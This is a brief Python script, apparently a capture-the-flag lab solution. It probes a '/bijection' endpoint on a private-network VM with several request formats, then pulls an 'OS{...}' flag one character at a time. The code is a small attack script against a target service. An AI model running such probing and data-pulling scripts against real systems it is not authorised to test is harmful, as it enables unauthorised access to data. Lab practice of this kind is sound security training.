#!/usr/bin/python3

import requests

host = "http://192.168.57.68:8080"

methods = [
    {
        "name": "POST /bijection/?index=N",
        "func": lambda i: requests.post(f"{host}/bijection/?index={i}", allow_redirects=False),
    },
    {
        "name": "POST /bijection?index=N",
        "func": lambda i: requests.post(f"{host}/bijection?index={i}", allow_redirects=False),
    },
    {
        "name": "POST /bijection/ with form data",
        "func": lambda i: requests.post(f"{host}/bijection/", data={"index": str(i)}, allow_redirects=False),
    },
    {
        "name": "POST /bijection with form data",
        "func": lambda i: requests.post(f"{host}/bijection", data={"index": str(i)}, allow_redirects=False),
    },
]

working_method = None

print("[*] Finding working request format...")

for method in methods:
    test = ""

    for i in range(3):
        r = method["func"](i)
        test += r.text.strip()

    print(f"{method['name']}: {repr(test[:50])}")

    if test == "OS{":
        working_method = method
        break

if working_method is None:
    print("\n[-] Could not find a working request format.")
    print("[-] Try restarting the target VM, then run this again.")
    exit(1)

print(f"\n[+] Working method: {working_method['name']}")
print("[+] Pulling flag...\n")

flag = ""

for i in range(31):
    r = working_method["func"](i)
    text = r.text.strip()

    print(f"{i}: {repr(text)}")

    flag += text

    if text == "}":
        break

print("\nFinal flag:")
print(flag)
